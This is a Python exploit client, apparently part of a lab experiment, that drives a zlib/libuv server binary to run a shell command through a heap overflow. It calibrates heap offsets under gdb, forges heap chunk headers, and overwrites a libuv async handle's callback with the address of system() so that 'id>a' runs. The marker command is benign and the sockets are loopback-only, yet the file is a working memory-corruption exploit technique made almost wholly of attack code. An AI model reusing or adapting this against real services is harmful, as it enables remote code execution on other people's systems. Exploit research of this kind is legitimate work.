#!/usr/bin/env python3
"""zlib2shell W3 — loopback client for the libuv rung-5 experiment.

Modes:
  calibrate  run the server under gdb, report ASYNC_ADDR - state->in
  exploit    stall the peer with a crafted request; libuv should dispatch
             system("id>a") after gz_vacate() rewrites the async handle
  safe       drain the peer normally; no overflow, no marker

All sockets are plant-started 127.0.0.1 sockets; the command is benign and
its only side effect is the file `a` in --out.
"""
import argparse
import os
import random
import re
import socket
import struct
import subprocess
import sys
import time

REQ = 359400
STALL_OFFSET = 65535  # observed WRITTEN on every W1/W2 vulnerable run

MSG_HDR_OFF = 293568  # state->msg-16 minus state->in, from W3 gdb capture
MSG_HDR = bytes.fromhex("00" * 8 + "41" + "00" * 7)

TOP_HDR_OFF = 293632  # main_arena.top minus state->in, from W3 gdb capture
TOP_HDR = bytes.fromhex("00" * 8 + "1101" + "00" * 6)
KEYS = ("PORT", "SYSTEM_ADDR", "ASYNC_ADDR", "LOOP_ADDR", "HANDLE_SIZE",
        "ASYNC_CB_OFF", "HANDLE_HEX")

ALL_LINES = []


def peer_payload():
    rnd = random.Random(0x5A17C7)
    return bytearray(rnd.getrandbits(8) for _ in range(REQ))


def start_server(binary, out, gdb=False):
    cmd = [binary]
    if gdb:
        cmd = ["gdb", "-q", "-batch", "-ex", "set pagination off",
               "-ex", "break gzwrite.c:394", "-ex", "break gzwrite.c:395",
               "-ex", "run",
               "-ex", "print/x state->in",
               "-ex", "print/x g_async", "-ex", "frame 3",
               "-ex", "print/x req", "-ex", "frame 0",
               "-ex", "print strm->avail_in",
               "-ex", "x/16bx state->msg-16",
               "-ex", "print/x strm->next_in", "-ex", "p/x main_arena.top",
               "-ex", "x/16bx (char *)main_arena.top",
               "-ex", "continue", "-ex", "x/16bx 0x46ae30",
               "-ex", "x/16bx 0x46ae90", "-ex", "x/16bx 0x46aeb0",
               "-ex", "x/32bx 0x46afe0",
               "-ex", "continue", "-ex", "bt",
               "-ex", "info symbol $pc", "-ex", "x/8i $pc-32",

               "--args", binary]
    return subprocess.Popen(cmd, stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT, text=True,
                            bufsize=1, cwd=out)


def read_until(proc, until, timeout=30):
    vals = {}
    deadline = time.time() + timeout
    while time.time() < deadline:
        raw = proc.stdout.readline()
        if not raw:
            break
        ALL_LINES.append(raw)
        line = raw.strip()
        for key in KEYS:
            if line.startswith(key + "="):
                vals[key] = line.split("=", 1)[1]
        if until in vals:
            return vals
    return vals


def connect(port, recvbuf):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, recvbuf)
    s.settimeout(15)
    s.connect(("127.0.0.1", port))
    return s


def wait_marker(out, seconds=8):
    path = os.path.join(out, "a")
    end = time.time() + seconds
    while time.time() < end:
        if os.path.exists(path):
            with open(path, "rb") as f:
                return True, f.read(200)
        time.sleep(0.05)
    return False, b""


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--binary", required=True)
    ap.add_argument("--out", required=True)
    ap.add_argument("--mode", choices=["calibrate", "exploit", "safe", "debug"],
                    default="exploit")
    ap.add_argument("--delta", type=int, default=0)
    ap.add_argument("--log", default="")
    a = ap.parse_args()
    if a.mode == "safe":
        os.environ["TCP_SNDBUF"] = "1048576"
    os.makedirs(a.out, exist_ok=True)
    proc = start_server(a.binary, a.out, gdb=(a.mode in ("calibrate", "debug")))
    vals = read_until(proc, "PORT")
    if "PORT" not in vals:
        print("STARTUP_FAIL")
        proc.kill()
        return 2
    port = int(vals["PORT"])

    # The server prints the rest of its startup after accept().
    s = connect(port, 4096 if a.mode != "safe" else 1 << 20)
    vals.update(read_until(proc, "HANDLE_HEX"))
    if "HANDLE_HEX" not in vals:
        print("HANDLE_INFO_FAIL")
        proc.kill()
        return 2

    payload = peer_payload()
    if a.mode in ("exploit", "debug"):
        handle = bytearray(bytes.fromhex(vals["HANDLE_HEX"]))
        if not os.environ.get("KEEP_HANDLE"):
            handle[0:8] = b"id>a\x00\x00\x00\x00"
        off = int(vals["ASYNC_CB_OFF"])
        addr = int(vals["SYSTEM_ADDR"], 16)
        if not os.environ.get("KEEP_CB"):
            handle[off:off + 8] = struct.pack("<Q", addr)
        src = STALL_OFFSET + a.delta
        if src < 0 or src + len(handle) > REQ:
            print("BAD_DELTA=%d" % a.delta)
            proc.kill()
            return 2
        payload[src:src + len(handle)] = handle
        msrc = STALL_OFFSET + MSG_HDR_OFF
        payload[msrc:msrc + len(MSG_HDR)] = MSG_HDR
        tsrc = STALL_OFFSET + TOP_HDR_OFF
        payload[tsrc:tsrc + len(TOP_HDR)] = TOP_HDR
        print("CRAFT_SRC=%d HANDLE_OFF=%d SYSTEM_ADDR=%s DELTA=%d" %
              (src, off, vals["SYSTEM_ADDR"], a.delta))

    s.sendall(bytes(payload))
    if a.mode != "safe":
        head = b""
        while len(head) < 10:
            chunk = s.recv(10 - len(head))
            if not chunk:
                break
            head += chunk
        print("HEADER_BYTES=%d" % len(head))
    else:
        while True:
            try:
                chunk = s.recv(65536)
            except socket.timeout:
                break
            if not chunk:
                break

    text = "".join(ALL_LINES)
    if a.mode == "calibrate":
        try:
            proc.wait(timeout=25)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
        text += proc.stdout.read()
        values = re.findall(r"\$\d+ = (0x[0-9a-fA-F]+)", text)
        if not values:
            print("CALIBRATION_FAIL values=%r" % values)
            return 2
        in_addr = values[0]
        delta = int(vals["ASYNC_ADDR"], 16) - int(in_addr, 16)
        print("IN_ADDR=%s ASYNC_ADDR=%s DELTA=%d" %
              (in_addr, vals["ASYNC_ADDR"], delta))
        print("DELTA=%d" % delta)
    else:
        ok, body = wait_marker(a.out)
        print("MARKER=%d MARKER_BODY=%r" % (ok, body))
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
        text += proc.stdout.read()
        for line in text.splitlines():
            if line.startswith(("REQ_BYTES=", "WRITTEN=", "PRINTF_RC=",
                                "UV_SENT=", "UV_RAN=", "SERVER_DONE=")):
                print(line)
        print("SERVER_RC=%d" % proc.returncode)

    s.close()
    if a.log:
        with open(a.log, "w") as f:
            f.write(text)
    return 0


if __name__ == "__main__":
    sys.exit(main())
